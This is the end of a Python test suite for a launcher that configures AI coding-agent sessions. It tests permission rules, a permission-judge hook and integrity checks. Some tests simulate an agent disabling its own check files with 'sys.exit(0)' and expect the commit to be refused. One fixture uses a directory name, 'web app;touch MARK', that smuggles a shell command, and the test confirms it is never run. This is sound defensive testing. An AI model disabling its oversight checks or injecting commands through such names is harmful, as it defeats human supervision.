        launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        cfg = project / "telesma" / "config.md"
        old = ["Bash(git add:*)", "Bash(git commit:\\*)", "Bash(git tag telesma/phase-:*)", "Bash(git push origin task-:*)"]
        text = cfg.read_text(encoding="utf-8")
        text = text.replace("- **Allowed commands**:\n", "- **Allowed commands**:\n" + "".join(f"  - {r}\n" for r in old), 1)
        cfg.write_text(text, encoding="utf-8")
        settings = project / ".claude" / "settings.local.json"
        data = json.loads(settings.read_text(encoding="utf-8"))
        data["permissions"]["allow"] += ["Bash(git add:*)", "Bash(gh pr create:*)", "Bash(git rebase:*)"]
        settings.write_text(json.dumps(data), encoding="utf-8")
        subprocess.run([sys.executable, str(TRUST), "stamp", str(project)], env=env_for(tmp), check=True)
        (project / "telesma" / "state" / ".telesma-version").write_text("22\n")
        r = launch(tmp, project, "-m", "1")
        allow = json.loads(settings.read_text(encoding="utf-8"))["permissions"]["allow"]
        text = cfg.read_text(encoding="utf-8")
        ok(r.returncode == 0 and started(tmp), f"a format-22 project with the old rules starts without a trust question (exit {r.returncode})")
        ok(not any(x in allow for x in ("Bash(git add:*)", "Bash(git commit:*)", "Bash(gh pr create:*)", "Bash(git rebase:*)")),
           "the retired rules are gone from settings.local.json (else the sync would bring them back)")
        ok("git add:" not in text and "git commit:" not in text and "origin task-" not in text and "Bash(ls:*)" in text,
           "… and from config.md (an editor's `\\*` too); the other rules stay")


def test_no_silent_exit():
    print("helpers that fail — the start says so and goes on")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp)
        launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        rep = project / "telesma" / "state" / "REPORT.md"
        rep.write_bytes(rep.read_bytes() + b"\n[2026-11-01] caf\xe9 problem\n")
        r = launch(tmp, project, "-m", "1")
        ok(r.returncode == 0 and started(tmp), f"a non-UTF-8 byte in REPORT.md: the session still starts (exit {r.returncode})")
        ok("Traceback" not in r.out or "the diagnosis did not finish" in r.out, "no bare traceback: either nothing fails or the failure is named")
        ok(not re.search(r"\$\(grep -c[^\n]*\|\| echo 0\)", SCRIPT), "no `grep -c … || echo 0` left (it yields two lines on no match)")
        for site in (r'_cw=\$\(python3 "\$CHECKS_DIR/telesma-checks.py" --validate[^\n]*\) \\\n\s*\|\|',
                     r'if ! DIAGNOSIS=\$\(python3 "\$REPAIR_TOOL"',
                     r'--last-error 2>/dev/null\) \|\| _telemetry_error=""',
                     r"if python3 - \"\$_trim\" <<'PYTRIM'"):
            ok(re.search(site, SCRIPT) is not None, f"a failing helper cannot end the launcher under set -e: /{site[:38]}…/")


def test_survey_preconditions():
    print("survey — an existing plan is never replaced; the launcher's own writes do not block it")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp, clarified=False, **{"Project/Adopted": "yes", "Tests/Full suite command": "true"})
        plan = project / "telesma" / "state" / "PLAN.md"
        before = plan.read_bytes()
        r = launch(tmp, project, TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 1 and "already holds tasks but no Phase 0" in r.out and plan.read_bytes() == before and not started(tmp),
           f"Adopted: yes on a project with a plan: refused, PLAN.md byte-identical (exit {r.returncode})")
        plan.unlink()
        git(project, "commit", "-q", "-am", "no plan")
        ok(git(project, "status", "--porcelain", "--untracked-files=no").strip().startswith("M telesma/config.md")
           or git(project, "status", "--porcelain", "--untracked-files=no").strip() == "",
           "(fixture: at most the launcher's own change to the tracked config.md is pending)")
        r = launch(tmp, project, TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 0 and "Uncommitted changes" not in r.out and started(tmp) and "### Phase 0:" in plan.read_text(),
           "a tracked telesma/config.md the launcher itself changed does not stop the survey")
        (project / "app.py").write_text("print('changed')\n")
        r = launch(tmp, project, TELESMA_TRUST_CONFIG="yes")
        ok(r.returncode == 1 and "Uncommitted changes" in r.out and "app.py" in r.out, "uncommitted code of the project still does")


def test_answers_verbatim():
    print("clarification answers — written as typed")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp, clarified=False)
        (project / "telesma" / "state" / "PLAN.md").unlink()
        q = project / "telesma" / "state" / "QUESTIONS.md"
        q.write_text("# Questions\n\n## Questions\n\n### Q1: Where do the files go? \\033[31mRED\n- **Proposed answer**: /tmp\n- **Answer**:\n- **Status**: ❓\n", encoding="utf-8")
        out = drive(["bash", str(LAUNCHER), str(project)], [r'C:\temp\new & "x"'], env_for(tmp, TELESMA_TRUST_CONFIG="yes"))
        text = q.read_text(encoding="utf-8")
        ok('- **Answer**: C:\\temp\\new & "x"\n' in text, f"backslashes survive: {[l for l in text.splitlines() if 'Answer**' in l]}")
        ok("\\033[31mRED" in out and "\x1b[31mRED" not in out.replace("\x1b[0m", ""), "a question's text is printed as text, not as an escape sequence")


def test_supervision():
    print("supervision files — a copy that is no delivered version is announced on every start")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp, **{"Checks/Enabled": "yes"})
        r = launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        hook = project / ".claude" / "hooks" / "telesma-permission-judge.py"
        runner = project / "telesma" / "checks" / "telesma-checks.py"
        ok(hook.is_file() and runner.is_file() and "differ from every version" not in r.out, "delivered copies: silence")
        hook.write_text("import sys\nsys.exit(0)\n")
        runner.write_text(runner.read_text() + "\n# switched off\n")
        for n in (1, 2):
            r = launch(tmp, project, "-m", "1")
            ok("differ from every version Telesma has delivered" in r.out and ".claude/hooks/telesma-permission-judge.py" in r.out
               and "telesma/checks/telesma-checks.py" in r.out, f"start {n} after the change: both files named")
        ok(hook.read_text() == "import sys\nsys.exit(0)\n", "nothing is overwritten (user edits win)")


def test_checks_baseline():
    print("quality checks — the launcher creates the integrity baseline and installs the wider PostToolUse hook")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        project = shipped_project(tmp, **{"Checks/Enabled": "yes"})
        launch(tmp, project, "-m", "1", TELESMA_TRUST_CONFIG="yes")
        runner = project / "telesma" / "checks" / "telesma-checks.py"
        base = project / ".git" / "telesma-checks" / "baseline.json"
        ok(base.is_file(), "first start: .git/telesma-checks/baseline.json exists")
        settings = json.loads((project / ".claude" / "settings.local.json").read_text())
        post = [g for g in settings["hooks"]["PostToolUse"] if "--posttooluse" in g["hooks"][0]["command"]]
        ok(len(post) == 1 and "Edit" in post[0]["matcher"] and "Bash" in post[0]["matcher"]
           and post[0]["hooks"][0]["timeout"] >= 300, "PostToolUse: Bash and the edit tools, a limit long enough to verify a commit")

        def hook(command):
            payload = {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(project)}
            r = subprocess.run([sys.executable, "-B", str(runner), "--pretooluse"], input=json.dumps(payload),
                               capture_output=True, text=True, cwd=project,
                               env=dict(env_for(tmp), CLAUDE_PROJECT_DIR=str(project)), timeout=120)
            return r.stdout + r.stderr

        (project / "app.py").write_text("print('hello')\n")
        out = hook("git add app.py && git commit -m change")
        ok("baseline" not in out and "differ from what the human approved" not in out,
           "a commit right after the start is not stopped for a missing baseline")
        # the agent switches a check file off behind the hook's back → the next commit stops
        runner_secrets = project / "telesma" / "checks" / "secrets" / "run.py"
        runner_secrets.write_text("import sys\nsys.exit(0)\n")
        out = hook("git add app.py && git commit -m change")
        ok("deny" in out and "secrets/run.py" in out, "a check file changed without approval: the commit is refused, the file named")
        # ... and a new start does not bless it (the file is no delivered version)
        launch(tmp, project, "-m", "1")
        out = hook("git add app.py && git commit -m change")
        ok("deny" in out and "secrets/run.py" in out, "the next start does not record the changed file as approved")


def test_wizard_helpers():
    print("setup engine and GitHub wizard — names from the project are data")
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        mono = tmp / "mono"
        (mono / "web app;touch MARK").mkdir(parents=True)
        (mono / "web app;touch MARK" / "package.json").write_text('{"scripts":{"test":"true"}}')
        (mono / "api").mkdir()
        (mono / "api" / "go.mod").write_text("module x\n")
        c = tmp / "config.md"
        c.write_text(TEMPLATE.read_text(encoding="utf-8"), encoding="utf-8")
        cfg("tests", c, "--stack", "auto", "--project", mono)
        cmd = ts.kv(cfg("status", c))["test_command"]
        ok("(cd 'web app;touch MARK' && " in cmd and "(cd api && go test ./...)" in cmd, f"a subdirectory name is quoted in the test command: {cmd}")
        node = cmd.split(" && (cd 'web app")[1]
        r = subprocess.run(["bash", "-c", "(cd 'web app" + node.replace("npm test", "pwd")], cwd=mono, capture_output=True, text=True)
        ok(r.returncode == 0 and r.stdout.strip().endswith("web app;touch MARK") and not (mono / "MARK").exists(),
           "… the command enters that directory and runs nothing from its name")

        wf = tmp / "proj" / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text("name: ci\non:\n  push:\n    branches: [main]\n  pull_request:\npermissions:\n  contents: read\n"
                                   "jobs:\n  test:\n    runs-on: ubuntu-latest\n  lint:   # style\n    runs-on: ubuntu-latest\n")
        setup = (ROOT / "templates" / "integrations" / "git" / "github" / "setup.sh").read_text(encoding="utf-8")
        block = re.search(r"^    HINT=\$\(awk .*?\n(?=fi\n)", setup, re.M | re.S).group(0)
        r = subprocess.run(["/bin/bash", "-c", block + '\nprintf "%s" "$HINT"'], env=dict(os.environ, PROJECT_DIR=str(tmp / "proj")),
                           capture_output=True, text=True)
        ok(r.stdout == "lint, test", f"required-checks hint: the keys under jobs: only, no trigger names, no stray spaces ({r.stdout!r})")


if __name__ == "__main__":
    test_rotation()
    test_trimming()
    test_trust_gate()
    test_mode()
    test_links_and_integrations()
    test_prompt_route()
    test_generalization()
    test_lock()
    test_broken_settings()
    test_format_gate()
    test_no_silent_exit()
    test_survey_preconditions()
    test_answers_verbatim()
    test_supervision()
    test_checks_baseline()
    test_wizard_helpers()
    print()
    if FAILURES:
        print(f"FAILURES: {len(FAILURES)}")
        for f in FAILURES:
            print("  -", f)
        sys.exit(1)
    print("OK — all checks passed")
